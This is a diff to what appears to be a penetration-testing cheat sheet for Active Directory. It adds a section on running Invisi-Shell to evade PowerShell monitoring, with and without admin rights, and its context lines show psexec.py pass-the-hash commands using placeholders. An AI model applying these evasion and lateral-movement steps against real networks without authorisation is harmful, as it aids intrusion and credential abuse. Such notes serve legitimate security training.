@@ -2,6 +2,7 @@
 
 # Summary
 * [General](#General)
+* [Must do](#Must-do)
 * [Domain Enumeration](#Domain-Enumeration)
     * [Powerview Domain](#Powerview-Domain)
     * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
@@ -62,6 +63,13 @@ If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
 ```
 python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
 python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
+```
+
+# Must do
+#### Invisi-Shell - https://github.com/OmerYa/Invisi-Shell
+```
+- With admin privileges -> RunWithPathAsAdmin.bat 
+- Without admin privileges -> RunWithRegistryNonAdmin.bat
 ```
 
 # Domain Enumeration
